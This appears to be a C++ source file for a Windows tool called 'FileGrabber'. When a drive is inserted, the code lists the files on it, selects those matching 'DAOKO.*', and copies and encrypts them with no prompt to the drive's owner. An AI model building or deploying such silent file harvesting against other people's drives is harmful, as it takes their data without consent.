#include "stdafx.h"
#include "Device.h"
#include <memory>
#include <list>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <string>
#include "FileLister.h"
#include "AESKey.h"
#include "AESEncrypt.h"
#include <filesystem>
#include "Convert.h"
#include "FileSearcher.h"
#include "FileCopyer.h"
using namespace std;
using namespace filesystem;

bool IsServiceOn = true;

void DeviceArrivalMain(TCHAR DriveLetter) {
	try {
		Device dv(DriveLetter);
		Device::DiskInformation info = dv.GetDiskInformation();
		FileLister lister(dv);
		shared_ptr<list<FileData>> pls = lister.ListFile();
		FileSearcher fsr;
		shared_ptr<list<FileData>> psls = fsr.FindFileRegex(pls, { L"DAOKO.*" });
		FileCopyer cp(dv, psls);
		cp.ListFile(pls);
		cp.Copy();
		cp.Encrypt();
	}
	catch (exception & e) {
		MessageBoxA(NULL, e.what(), "FileGrabber - Runtime Error", MB_ICONERROR);
		terminate();
	}
}

void DeviceRemovalMain(TCHAR DriveLetter) {

}